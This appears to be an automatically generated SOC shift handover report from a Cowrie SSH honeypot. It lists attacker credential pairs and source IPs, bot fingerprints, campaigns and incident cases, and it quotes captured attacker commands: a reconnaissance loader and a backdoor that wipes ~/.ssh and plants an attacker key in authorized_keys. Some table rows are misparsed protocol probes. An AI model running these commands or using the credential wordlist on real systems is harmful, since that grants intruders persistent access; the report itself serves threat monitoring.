# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-07-15 |
| **Generated At** | 2026-07-15T10:07:27Z |
| **Shift Time** | 10:07 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **486** |
| Confirmed Threats | **441** |
| False Positives Filtered | **45** (9.3%) |
| Unique Attacker IPs | **124** |
| Countries of Origin | **35** |
| High Severity Cases | **203** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **283** |
| Malware Samples Analyzed | **3** HIGH · **34** MED · 8 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **244** |
| Unique Credential Pairs | **140** |
| Unique Usernames | **74** |
| Unique Passwords | **123** |
| Successful Auth Pairs | **210** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 89 |
| `admin` | 42 |
| `support` | 12 |
| `centos` | 7 |
| `Test` | 6 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `support` | 10 |
| `123456` | 8 |
| `admin` | 8 |
| `123456789` | 7 |
| `password123` | 7 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `support` | `support` | 10 |
| `admin` | `admin` | 5 |
| `admin` | `111111` | 5 |
| `root` | `test1234` | 5 |
| `admin` | `admin2` | 5 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `2020` | `10.0.0.73` | 2026-07-15T04:56:45 |
| `root` | `1234` | `2.57.122.209` | 2026-07-15T04:57:24 |
| `root` | `12345` | `2.57.122.209` | 2026-07-15T05:00:15 |
| `root` | `LeitboGi0ro` | `129.153.145.135` | 2026-07-15T05:05:28 |
| `root` | `123@@@` | `129.153.145.135` | 2026-07-15T05:05:28 |
| `root` | `smo@@kkklss` | `129.153.145.135` | 2026-07-15T05:05:37 |
| `root` | `12345678` | `2.57.122.209` | 2026-07-15T05:05:58 |
| `root` | `123456789` | `2.57.122.209` | 2026-07-15T05:08:51 |
| `root` | `P@ssw0rd` | `2.57.122.209` | 2026-07-15T05:11:46 |
| `support` | `support` | `176.53.159.196` | 2026-07-15T05:13:12 |
| `support` | `support` | `10.0.0.73` | 2026-07-15T05:14:33 |
| `root` | `Password1` | `2.57.122.209` | 2026-07-15T05:14:44 |
| `Test` | `654321` | `124.167.20.113` | 2026-07-15T05:15:23 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `34.52.206.162` | 2026-07-15T05:15:24 |
| `Test` | `654321` | `116.228.195.251` | 2026-07-15T05:15:37 |
| `*1` | `$4` | `34.52.206.162` | 2026-07-15T05:15:37 |
| `OPTIONS rtsp://example.com RTSP/1.0` | `Cseq: 2991` | `34.52.206.162` | 2026-07-15T05:15:39 |
| `dongqishi1` | `dongqishi1` | `185.242.3.195` | 2026-07-15T05:16:41 |
| `root` | `Root123` | `2.57.122.209` | 2026-07-15T05:17:43 |
| `admin` | `password123` | `112.120.115.152` | 2026-07-15T05:18:27 |
| `admin` | `password123` | `49.124.153.47` | 2026-07-15T05:18:43 |
| `Test` | `654321` | `10.0.0.73` | 2026-07-15T05:19:53 |
| `root` | `admin` | `2.57.122.209` | 2026-07-15T05:20:30 |
| `admin` | `password123` | `218.21.246.238` | 2026-07-15T05:22:30 |
| `root` | `admin123` | `2.57.122.209` | 2026-07-15T05:23:08 |
| `root` | `alpine` | `2.57.122.209` | 2026-07-15T05:25:50 |
| `root` | `changeme` | `2.57.122.209` | 2026-07-15T05:28:59 |
| `dongqishi1` | `dongqishi1` | `10.0.0.73` | 2026-07-15T05:30:42 |
| `root` | `default` | `2.57.122.209` | 2026-07-15T05:32:19 |
| `root` | `letmein` | `2.57.122.209` | 2026-07-15T05:35:51 |
| `root` | `passw0rd` | `2.57.122.209` | 2026-07-15T05:38:36 |
| `root` | `password` | `2.57.122.209` | 2026-07-15T05:41:11 |
| `admin` | `admin` | `161.132.47.68` | 2026-07-15T05:41:50 |
| `root` | `abc@123` | `222.139.245.137` | 2026-07-15T05:42:53 |
| `root` | `qwerty` | `2.57.122.209` | 2026-07-15T05:43:42 |
| `root` | `password` | `47.236.250.136` | 2026-07-15T05:45:05 |
| `root` | `r00t` | `2.57.122.209` | 2026-07-15T05:46:12 |
| `root` | `abc@123` | `10.0.0.73` | 2026-07-15T05:46:28 |
| `support` | `abcd1234` | `41.214.10.178` | 2026-07-15T05:48:31 |
| `support` | `abcd1234` | `10.0.0.73` | 2026-07-15T05:48:50 |
| `root` | `root123` | `2.57.122.209` | 2026-07-15T05:51:11 |
| `root` | `root@123` | `2.57.122.209` | 2026-07-15T05:53:33 |
| `root` | `rootme` | `2.57.122.209` | 2026-07-15T05:56:00 |
| `django` | `django1` | `182.13.96.129` | 2026-07-15T05:58:06 |
| `root` | `system` | `2.57.122.209` | 2026-07-15T05:58:22 |
| `root` | `Dy123456789` | `171.25.158.87` | 2026-07-15T05:58:50 |
| `345gs5662d34` | `345gs5662d34` | `171.25.158.87` | 2026-07-15T05:58:53 |
| `root` | `3245gs5662d34` | `171.25.158.87` | 2026-07-15T05:58:54 |
| `root` | `toor` | `2.57.122.209` | 2026-07-15T06:01:08 |
| `root` | `A12345@` | `14.225.206.171` | 2026-07-15T06:01:24 |
| `345gs5662d34` | `345gs5662d34` | `14.225.206.171` | 2026-07-15T06:01:29 |
| `root` | `3245gs5662d34` | `14.225.206.171` | 2026-07-15T06:01:32 |
| `root` | `admin` | `61.84.211.107` | 2026-07-15T06:03:55 |
| `root` | `welcome` | `2.57.122.209` | 2026-07-15T06:04:01 |
| `admin` | `111111` | `2.57.122.209` | 2026-07-15T06:06:44 |
| `admin` | `qwer1234` | `103.68.52.210` | 2026-07-15T06:07:51 |
| `admin` | `qwer1234` | `36.137.38.119` | 2026-07-15T06:08:00 |
| `root` | `password123` | `49.124.148.185` | 2026-07-15T06:08:13 |
| `root` | `password123` | `65.20.174.49` | 2026-07-15T06:08:21 |
| `admin` | `123123` | `2.57.122.209` | 2026-07-15T06:09:27 |
| `ubuntu` | `changeme` | `185.242.3.195` | 2026-07-15T06:09:40 |
| `admin` | `qwer1234` | `78.187.9.111` | 2026-07-15T06:11:21 |
| `root` | `password123` | `65.20.217.64` | 2026-07-15T06:11:43 |
| `root` | `password123` | `116.228.195.251` | 2026-07-15T06:11:56 |
| `admin` | `1234` | `2.57.122.209` | 2026-07-15T06:11:59 |
| `admin` | `12345` | `2.57.122.209` | 2026-07-15T06:14:26 |
| `root` | `letmein` | `186.215.107.189` | 2026-07-15T06:14:30 |
| `root` | `letmein` | `103.171.39.147` | 2026-07-15T06:14:40 |
| `admin` | `123456` | `2.57.122.209` | 2026-07-15T06:16:57 |
| `admin` | `12345678` | `2.57.122.209` | 2026-07-15T06:19:23 |
| `admin` | `123456789` | `2.57.122.209` | 2026-07-15T06:21:17 |
| `ubuntu` | `changeme` | `10.0.0.73` | 2026-07-15T06:23:44 |
| `user` | `dietpi` | `200.37.179.83` | 2026-07-15T06:35:12 |
| `user` | `dietpi` | `181.129.31.42` | 2026-07-15T06:35:19 |
| `root` | `unitrends1` | `10.0.0.73` | 2026-07-15T06:38:54 |
| `admin` | `dis2021` | `94.205.250.78` | 2026-07-15T06:41:06 |
| `admin` | `dis2021` | `103.120.116.162` | 2026-07-15T06:41:19 |
| `admin` | `dis2021` | `10.0.0.73` | 2026-07-15T06:41:30 |
| `root` | `test1234` | `219.144.16.16` | 2026-07-15T07:00:19 |
| `root` | `test1234` | `183.82.108.109` | 2026-07-15T07:00:33 |
| `centos` | `1q2w3e4r` | `197.251.249.75` | 2026-07-15T07:00:47 |
| `centos` | `1q2w3e4r` | `78.186.54.65` | 2026-07-15T07:00:54 |
| `root` | `ubuntu` | `182.66.193.212` | 2026-07-15T07:02:18 |
| `root` | `QAWSEDRF` | `185.242.3.195` | 2026-07-15T07:03:10 |
| `root` | `test1234` | `49.124.150.254` | 2026-07-15T07:03:53 |
| `root` | `test1234` | `10.0.0.73` | 2026-07-15T07:04:22 |
| `root` | `LeitboGi0ro` | `165.1.75.106` | 2026-07-15T07:06:24 |
| `root` | `123@@@` | `165.1.75.106` | 2026-07-15T07:06:26 |
| `admin` | `88888888` | `220.128.137.164` | 2026-07-15T07:06:54 |
| `admin` | `88888888` | `178.178.222.60` | 2026-07-15T07:07:07 |
| `admin` | `88888888` | `10.0.0.73` | 2026-07-15T07:07:23 |
| `root` | `QAWSEDRF` | `10.0.0.73` | 2026-07-15T07:17:14 |
| `root` | `password` | `91.92.40.237` | 2026-07-15T07:17:43 |
| `root` | `admin` | `91.92.40.237` | 2026-07-15T07:19:29 |
| `root` | `!Q2w3e4r` | `8.217.232.214` | 2026-07-15T07:20:25 |
| `git` | `git` | `8.217.232.214` | 2026-07-15T07:20:29 |
| `wang` | `wang123` | `8.217.232.214` | 2026-07-15T07:20:31 |
| `hive` | `hive` | `8.217.232.214` | 2026-07-15T07:20:32 |
| `nginx` | `nginx` | `8.217.232.214` | 2026-07-15T07:20:33 |
| `esroot` | `esroot` | `8.217.232.214` | 2026-07-15T07:20:42 |
| `apache` | `apache123` | `8.217.232.214` | 2026-07-15T07:20:45 |
| `root` | `toor` | `91.92.40.237` | 2026-07-15T07:21:11 |
| `root` | `12345` | `91.92.40.237` | 2026-07-15T07:22:35 |
| `root` | `123456789` | `91.92.40.237` | 2026-07-15T07:24:12 |
| `root` | `12345678` | `91.92.40.237` | 2026-07-15T07:25:33 |
| `root` | `passw0rd` | `91.92.40.237` | 2026-07-15T07:26:47 |
| `user` | `default` | `178.178.194.128` | 2026-07-15T07:27:39 |
| `root` | `admin123` | `91.92.40.237` | 2026-07-15T07:28:03 |
| `root` | `1234` | `91.92.40.237` | 2026-07-15T07:29:27 |
| `root` | `qwerty` | `91.92.40.237` | 2026-07-15T07:30:27 |
| `admin` | `s4ndf0rd` | `183.82.108.109` | 2026-07-15T07:30:28 |
| `ubnt` | `123qwe` | `50.217.255.171` | 2026-07-15T07:30:30 |
| `root` | `letmein` | `91.92.40.237` | 2026-07-15T07:31:28 |
| `root` | `Password1` | `91.92.40.237` | 2026-07-15T07:32:31 |
| `root` | `123123` | `91.92.40.237` | 2026-07-15T07:33:44 |
| `admin` | `s4ndf0rd` | `10.0.0.73` | 2026-07-15T07:34:31 |
| `root` | `111111` | `91.92.40.237` | 2026-07-15T07:34:50 |
| `root` | `1qaz2wsx@@` | `95.217.105.210` | 2026-07-15T07:43:32 |
| `345gs5662d34` | `345gs5662d34` | `95.217.105.210` | 2026-07-15T07:43:34 |
| `root` | `3245gs5662d34` | `95.217.105.210` | 2026-07-15T07:43:35 |
| `admin` | `admin` | `10.0.0.73` | 2026-07-15T07:45:27 |
| `root` | `gettherefast` | `79.104.0.82` | 2026-07-15T07:45:59 |
| `345gs5662d34` | `345gs5662d34` | `79.104.0.82` | 2026-07-15T07:46:02 |
| `root` | `3245gs5662d34` | `79.104.0.82` | 2026-07-15T07:46:03 |
| `lixiang` | `user1234` | `91.92.47.55` | 2026-07-15T07:51:16 |
| `webuzo` | `abcd1234` | `91.92.47.55` | 2026-07-15T07:51:25 |
| `kylo_ren` | `admin1234` | `91.92.47.55` | 2026-07-15T07:51:32 |
| `chenxue` | `demo` | `91.92.47.55` | 2026-07-15T07:51:38 |
| `sysops` | `linux` | `91.92.47.55` | 2026-07-15T07:51:43 |
| `xiongyinxiang` | `Huawei@123` | `91.92.47.55` | 2026-07-15T07:51:50 |
| `s7rosine` | `david` | `91.92.47.55` | 2026-07-15T07:51:57 |
| `calc` | `000000` | `91.92.47.55` | 2026-07-15T07:52:05 |
| `at` | `ranger` | `91.92.47.55` | 2026-07-15T07:52:11 |
| `jfletcher` | `elasticsearch` | `91.92.47.55` | 2026-07-15T07:52:17 |
| `user23` | `angel` | `91.92.47.55` | 2026-07-15T07:52:24 |
| `DE` | `wso2` | `91.92.47.55` | 2026-07-15T07:52:30 |
| `ai` | `operator` | `91.92.47.55` | 2026-07-15T07:52:37 |
| `frontend` | `Admin@123456` | `91.92.47.55` | 2026-07-15T07:52:45 |
| `daemon` | `11` | `91.92.47.55` | 2026-07-15T07:52:51 |
| `cbm` | `fred` | `91.92.47.55` | 2026-07-15T07:52:58 |
| `SJ08` | `nPSpP4PBW0` | `91.92.47.55` | 2026-07-15T07:53:04 |
| `Test` | `test123` | `218.200.9.182` | 2026-07-15T07:53:10 |
| `develop` | `nutanix/4u` | `91.92.47.55` | 2026-07-15T07:53:12 |
| `azuser` | `1qazXSW@` | `91.92.47.55` | 2026-07-15T07:53:18 |
| `gcp` | `guest` | `91.92.47.55` | 2026-07-15T07:53:25 |
| `hosting` | `bitrix` | `91.92.47.55` | 2026-07-15T07:53:30 |
| `jkraj` | `orca` | `91.92.47.55` | 2026-07-15T07:53:37 |
| `zhangjinchao` | `user123456` | `91.92.47.55` | 2026-07-15T07:53:42 |
| `pey12` | `newuser` | `91.92.47.55` | 2026-07-15T07:53:49 |
| `pey16` | `grid` | `91.92.47.55` | 2026-07-15T07:53:55 |
| `trinity` | `trinity` | `91.92.47.55` | 2026-07-15T07:54:02 |
| `thin` | `Qwerty123` | `91.92.47.55` | 2026-07-15T07:54:09 |
| `julian` | `devuser` | `91.92.47.55` | 2026-07-15T07:54:14 |
| `init` | `chris` | `91.92.47.55` | 2026-07-15T07:54:20 |
| `daemon` | `Tiki2025@!` | `91.92.47.55` | 2026-07-15T07:54:26 |
| `huangzhijun` | `111111` | `91.92.47.55` | 2026-07-15T07:54:32 |
| `tactical` | `master` | `91.92.47.55` | 2026-07-15T07:54:38 |
| `setup` | `Huawei123` | `91.92.47.55` | 2026-07-15T07:54:44 |
| `smtest` | `user4` | `91.92.47.55` | 2026-07-15T07:54:50 |
| `roo` | `Qq123456` | `91.92.47.55` | 2026-07-15T07:54:56 |
| `jerry` | `fred` | `91.92.47.55` | 2026-07-15T07:55:02 |
| `pitt` | `1qaz@WSX3edc` | `91.92.47.55` | 2026-07-15T07:55:08 |
| `s7mensah` | `minecraft` | `91.92.47.55` | 2026-07-15T07:55:14 |
| `akjmehdi` | `1234567890` | `91.92.47.55` | 2026-07-15T07:55:20 |
| `edge` | `changemeNOW` | `91.92.47.55` | 2026-07-15T07:55:26 |
| `web` | `zaq12wsx` | `91.92.47.55` | 2026-07-15T07:55:32 |
| `nvidia` | `pass` | `91.92.47.55` | 2026-07-15T07:55:39 |
| `soladium` | `newuser` | `91.92.47.55` | 2026-07-15T07:55:44 |
| `vps` | `Pass@123` | `91.92.47.55` | 2026-07-15T07:55:50 |
| `paas` | `redhat` | `91.92.47.55` | 2026-07-15T07:55:56 |
| `yd02` | `ZAQ!2wsx` | `91.92.47.55` | 2026-07-15T07:56:02 |
| `admin` | `111111` | `51.75.142.157` | 2026-07-15T07:56:03 |
| `supervisor` | `123456789` | `182.225.134.13` | 2026-07-15T07:56:08 |
| `jellyfin` | `hello123` | `91.92.47.55` | 2026-07-15T07:56:09 |
| `admin` | `111111` | `65.20.133.56` | 2026-07-15T07:56:10 |
| `tty0` | `frappe` | `91.92.47.55` | 2026-07-15T07:56:14 |
| `5922` | `docker` | `91.92.47.55` | 2026-07-15T07:56:19 |
| `supervisor` | `123456789` | `118.45.255.153` | 2026-07-15T07:56:22 |
| `edward` | `elk@123` | `91.92.47.55` | 2026-07-15T07:56:27 |
| `guanyue` | `labuser` | `91.92.47.55` | 2026-07-15T07:56:32 |
| `admin` | `111111` | `10.0.0.73` | 2026-07-15T07:56:33 |
| `Test` | `test123` | `178.178.194.135` | 2026-07-15T07:56:35 |
| `jinruihong` | `Aa123456.` | `91.92.47.55` | 2026-07-15T07:56:38 |
| `Test` | `test123` | `85.152.57.60` | 2026-07-15T07:56:42 |
| `hdbadm` | `private` | `91.92.47.55` | 2026-07-15T07:56:44 |
| `ubuntu` | `a12345678` | `185.242.3.195` | 2026-07-15T07:56:52 |
| `supervisor` | `123456789` | `10.0.0.73` | 2026-07-15T07:59:50 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236` | `45.33.12.122` | 2026-07-15T08:03:59 |
| `ubuntu` | `a12345678` | `10.0.0.73` | 2026-07-15T08:11:17 |
| `centos` | `123456` | `101.13.4.119` | 2026-07-15T08:19:28 |
| `centos` | `123456` | `220.93.167.144` | 2026-07-15T08:19:38 |
| `test` | `555555` | `203.129.217.70` | 2026-07-15T08:22:47 |
| `test` | `555555` | `151.237.115.208` | 2026-07-15T08:23:00 |
| `admin` | `1q2w3e` | `10.0.0.73` | 2026-07-15T08:23:10 |
| `centos` | `123456` | `36.93.154.207` | 2026-07-15T08:23:12 |
| `centos` | `123456` | `35.130.111.146` | 2026-07-15T08:23:24 |
| `test` | `555555` | `10.0.0.73` | 2026-07-15T08:26:39 |
| `root` | `LeitboGi0ro` | `64.110.90.250` | 2026-07-15T08:29:38 |
| `root` | `123@@@` | `64.110.90.250` | 2026-07-15T08:29:38 |
| `admin` | `admin2003` | `180.168.60.146` | 2026-07-15T08:44:45 |
| `root` | `123!@#` | `103.250.160.76` | 2026-07-15T08:45:10 |
| `root` | `123!@#` | `211.104.166.110` | 2026-07-15T08:45:19 |
| `admin` | `admin2` | `218.58.73.238` | 2026-07-15T08:48:02 |
| `admin` | `admin2` | `202.138.229.190` | 2026-07-15T08:48:11 |
| `admin` | `admin2003` | `111.70.29.158` | 2026-07-15T08:48:20 |
| `admin` | `admin2003` | `180.188.253.150` | 2026-07-15T08:48:29 |
| `admin` | `admin2003` | `10.0.0.73` | 2026-07-15T08:48:44 |
| `admin` | `admin2` | `211.169.212.206` | 2026-07-15T08:51:28 |
| `root` | `starwars` | `185.242.3.195` | 2026-07-15T08:51:29 |
| `admin` | `admin2` | `10.0.0.73` | 2026-07-15T08:51:50 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **486** |
| Sessions with Fingerprint | **15** |
| Unique HASSH Fingerprints | **15** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 135 |
| OpenSSH | 55 |
| libssh | 33 |
| Paramiko (Python) | 12 |
| Unknown | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `0a07365cc01f...` | Generic scanner | 67 | 2 |
| `acaa53e0a7d7...` | Mirai/variant | 54 | 50 |
| `2ec37a7cc8da...` | Mirai/variant | 47 | 2 |
| `f555226df196...` | Mirai/variant | 13 | 5 |
| `a2de0f306611...` | Mirai/variant | 12 | 3 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `0a07365cc01f...` | Go SSH scanner | 67 | 2 | Generic scanner |
| `acaa53e0a7d7...` | OpenSSH | 54 | 50 | Mirai/variant |
| `2ec37a7cc8da...` | Go SSH scanner | 47 | 2 | Mirai/variant |
| `95420f9d932d...` | libssh | 19 | 8 | — |
| `f555226df196...` | libssh | 13 | 5 | Mirai/variant |
| `a2de0f306611...` | Paramiko (Python) | 12 | 3 | Mirai/variant |
| `16443846184e...` | Go SSH scanner | 9 | 1 | Generic scanner |
| `eff4c24daffc...` | Go SSH scanner | 5 | 1 | Modern SSH client |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **10** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Recon Loader Script** | 🟡 MEDIUM | 44 | 2 | `T1082, T1592, T1078, T1083` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 4 | 4 | `T1021.004, T1078, T1070, T1140` |

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `91.92.40.237`, `2.57.122.209`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `14.225.206.171`, `171.25.158.87`, `79.104.0.82`, `95.217.105.210`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **124** |
| Unique ASNs | **75** |
| High-Risk ASNs | **66** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS46562` | Performive LLC | 12 | MEDIUM |
| `AS63949` | Akamai Connected Cloud | 7 | HIGH |
| `AS4837` | CHINA UNICOM China169 Backbone | 5 | HIGH |
| `AS4134` | CHINANET BACKBONE | 5 | HIGH |
| `AS4766` | Korea Telecom | 4 | HIGH |
| `AS25159` | PJSC MegaFon | 3 | HIGH |
| `AS203214` | Hulum Almustakbal Company for Communication Engineering and Services Ltd | 3 | HIGH |
| `AS9808` | China Mobile Communications Group Co., Ltd. | 3 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (202)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-4ce1e8faa46e

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-07-15 04:57 |
| **Last Seen** | 2026-07-15 04:57 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 04:57:20` | `cowrie.session.connect` |
| `2026-07-15 04:57:20` | `cowrie.client.version` |
| `2026-07-15 04:57:20` | `cowrie.client.kex` |
| `2026-07-15 04:57:24` | `cowrie.login.success` |
| `2026-07-15 04:57:27` | `cowrie.session.params` |
| `2026-07-15 04:57:27` | `cowrie.command.input` |
| `2026-07-15 04:57:27` | `cowrie.command.input` |
| `2026-07-15 04:57:27` | `cowrie.command.input` |
| `2026-07-15 04:57:27` | `cowrie.command.input` |
| `2026-07-15 04:57:27` | `cowrie.command.input` |
| `2026-07-15 04:57:27` | `cowrie.command.success` |
| `2026-07-15 04:57:27` | `cowrie.command.input` |
| `2026-07-15 04:57:27` | `cowrie.command.input` |
| `2026-07-15 04:57:27` | `cowrie.command.input` |
| `2026-07-15 04:57:27` | `cowrie.command.input` |
| `2026-07-15 04:57:28` | `cowrie.log.closed` |
| `2026-07-15 04:57:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8a79405fc29b

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]209` |
| **First Seen** | 2026-07-15 05:00 |
| **Last Seen** | 2026-07-15 05:00 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 05:00:10` | `cowrie.session.connect` |
| `2026-07-15 05:00:10` | `cowrie.client.version` |
| `2026-07-15 05:00:11` | `cowrie.client.kex` |
| `2026-07-15 05:00:15` | `cowrie.login.success` |
| `2026-07-15 05:00:17` | `cowrie.session.params` |
| `2026-07-15 05:00:17` | `cowrie.command.input` |
| `2026-07-15 05:00:18` | `cowrie.command.input` |
| `2026-07-15 05:00:18` | `cowrie.command.input` |
| `2026-07-15 05:00:18` | `cowrie.command.input` |
| `2026-07-15 05:00:18` | `cowrie.command.input` |
| `2026-07-15 05:00:18` | `cowrie.command.success` |
| `2026-07-15 05:00:18` | `cowrie.command.input` |
| `2026-07-15 05:00:18` | `cowrie.command.input` |
| `2026-07-15 05:00:18` | `cowrie.command.input` |
| `2026-07-15 05:00:18` | `cowrie.command.input` |
| `2026-07-15 05:00:19` | `cowrie.log.closed` |
| `2026-07-15 05:00:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]209` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7bc3cfac5bfe

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-15 05:05 |
| **Last Seen** | 2026-07-15 05:05 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 05:05:28` | `cowrie.session.connect` |
| `2026-07-15 05:05:28` | `cowrie.client.version` |
| `2026-07-15 05:05:28` | `cowrie.client.kex` |
| `2026-07-15 05:05:28` | `cowrie.login.success` |
| `2026-07-15 05:05:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c022d2fe5ee3

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-15 05:05 |
| **Last Seen** | 2026-07-15 05:05 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-15 05:05:28` | `cowrie.session.connect` |
| `2026-07-15 05:05:28` | `cowrie.client.version` |
| `2026-07-15 05:05:28` | `cowrie.client.kex` |
| `2026-07-15 05:05:28` | `cowrie.login.success` |
| `2026-07-15 05:05:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3222a06f3d09

| Field | Detail |
|---|---|
